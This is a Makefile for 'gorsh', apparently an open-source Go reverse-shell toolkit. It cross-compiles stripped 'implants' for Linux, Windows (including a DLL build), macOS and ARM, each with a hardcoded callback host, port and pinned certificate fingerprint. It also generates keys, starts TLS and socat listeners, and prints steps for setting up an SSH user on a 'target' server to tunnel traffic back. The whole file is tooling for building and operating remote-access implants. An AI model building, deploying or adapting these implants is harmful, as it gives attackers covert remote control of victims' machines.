NAME=gorsh
# please god find a better name

OUT=build

SRV_KEY=certs/server.key
SRV_PEM=certs/server.pem

BUILD=packr build

AGNT=gorsh
SRVR=gorsh-listen

AGT_SRC=cmd/${AGNT}/*
SRV_SRC=cmd/${SRVR}/*

FINGERPRINT=$(shell openssl x509 -fingerprint -sha256 -noout -in ${SRV_PEM} | cut -d '=' -f2)
LHOST ?= 127.0.0.1
LPORT ?= 8443
STRIP=-s -w
LINUX_LDFLAGS=-ldflags "${STRIP} -X main.connectString=${LHOST}:${LPORT} -X main.fingerPrint=${FINGERPRINT}"

#TODO: Figure out why tab completion breaks when using -H windowsgui
# WIN_LDFLAGS=-ldflags "${STRIP} -X main.connectString=${LHOST}:${LPORT} -X main.fingerPrint=${FINGERPRINT} -H windowsgui"
WIN_LDFLAGS=-ldflags "${STRIP} -X main.connectString=${LHOST}:${LPORT} -X main.fingerPrint=${FINGERPRINT}"

MINGW=x86_64-w64-mingw32-gcc
CXX=x86_64-w64-mingw32-g++

# zStd is a highly efficient compression library that requires CGO compilation If you'd like to
# turn this feature on and have experience cross-compiling with cgo, enable the feature below for
# win/64 and linux/64 implants 
# ZSTD=-tags zstd

all: linux64 windows64 macos64 linux32 macos32 windows32 linux_arm linux_arm64 servers

linux: linux64 linux32 linux_arm linux_arm64

windows: windows32 windows64

depends:
	@mkdir certs 2>/dev/null
	openssl req -subj '/CN=localhost/O=Localhost/C=US' -new -newkey rsa:4096 -days 3650 -nodes -x509 -keyout ${SRV_KEY} -out ${SRV_PEM}
	@cat ${SRV_KEY} >> ${SRV_PEM}
	ssh-keygen -t ed25519 -f configs/id_ed25519 -N ''
	@echo
	@echo "================================================="
	@echo "Create a user with a /bin/false shell on the target ssh server."
	@echo "useradd -s /bin/false -m -d /home/sshuser -N sshuser"
	@echo
	@echo "Append the following line to that user's authorized_keys file:"
	@echo "NO-X11-FORWARDING,PERMITOPEN=\"0.0.0.0:1080\" `cat ./configs/id_ed25519.pub`"
	@echo
	@echo "If you know your target's public IP, you can also prepend the above with:"
	@echo "FROM=<ip or hostname>"
	@echo "================================================="


listen-socat:
	KEY=${SRV_KEY} PEM=${SRV_PEM} LISTEN=scripts/listen-socat.sh scripts/start.sh

listen:
	KEY=${SRV_KEY} PEM=${SRV_PEM} LISTEN=scripts/listen.sh scripts/start.sh

servers:
	GOOS=linux GOARCH=amd64 \
	${BUILD} ${LINUX_LDFLAGS} -o ${OUT}/srv/${SRVR} ${SRV_SRC}

linux64:
	$(eval GOOS=linux)
	$(eval GOARCH=amd64)
	${BUILD} ${ZSTD} ${LINUX_LDFLAGS} -o ${OUT}/${GOARCH}/${GOOS} ${AGT_SRC}

linux32:
	$(eval GOOS=linux)
	$(eval GOARCH=386)
	${BUILD} ${ZSTD} ${LINUX_LDFLAGS} -o ${OUT}/${GOARCH}/${GOOS} ${AGT_SRC}

linux_arm64:
	$(eval GOOS=linux)
	$(eval GOARCH=arm64)
	${BUILD} ${ZSTD} ${LINUX_LDFLAGS} -o ${OUT}/${GOARCH}/${GOOS} ${AGT_SRC}

linux_arm:
	$(eval GOOS=linux)
	$(eval GOARCH=arm)
	${BUILD} ${ZSTD} ${LINUX_LDFLAGS} -o ${OUT}/${GOARCH}/${GOOS} ${AGT_SRC}

windll:
	@# https://stackoverflow.com/questions/40573401/building-a-dll-with-go-1-7
	@cp cmd/gorsh/main.go ${OUT}/${NAME}.go
	@sed -i '1 a import "C"' ${OUT}/${NAME}.go
	@echo '//export Run' >> ${OUT}/${NAME}.go
	@echo 'func Run() { main() }' >> ${OUT}/${NAME}.go

	CGO_ENABLED=1 CC=${MINGW} CXX=${CXX} GOOS=windows GOARCH=amd64 \
	${BUILD} ${LINUX_LDFLAGS} ${ZSTD} -buildmode=c-archive -o ${OUT}/${NAME}.a ${OUT}/${NAME}.go
	${MINGW} -shared -pthread -o ${OUT}/${NAME}.dll scripts/${NAME}.c ${OUT}/${NAME}.a -lwinmm -lntdll -lws2_32

windows64:
	$(eval GOOS=windows)
	$(eval GOARCH=amd64)
	# CGO_ENABLED=1 CC=${MINGW} 
	GOOS=${GOOS} GOARCH=${GOARCH} ${BUILD} ${ZSTD} ${WIN_LDFLAGS} -o ${OUT}/${GOARCH}/${GOOS}.exe ${AGT_SRC}

windows32:
	$(eval GOOS=windows)
	$(eval GOARCH=386)
	GOOS=${GOOS} GOARCH=${GOARCH} ${BUILD} ${WIN_LDFLAGS} -o ${OUT}/${GOARCH}/${GOOS}.exe ${AGT_SRC}

macos64:
	$(eval GOOS=darwin)
	$(eval GOARCH=amd64)
	${BUILD} ${ZSTD} ${LINUX_LDFLAGS} -o ${OUT}/${GOARCH}/${GOOS} ${AGT_SRC}

macos32:
	$(eval GOOS=darwin)
	$(eval GOARCH=386)
	${BUILD} ${ZSTD} ${LINUX_LDFLAGS} -o ${OUT}/${GOARCH}/${GOOS} ${AGT_SRC}

clean:
	rm -rf certs ${OUT} configs/id_*

enumscripts:
	@echo Updating Enum Scripts
	bash scripts/prepare_enum_scripts.sh


.PHONY: linux64 windows64 macos64 linux32 macos32 windows32 clean listen linux_arm linux_arm64 servers listen-socat
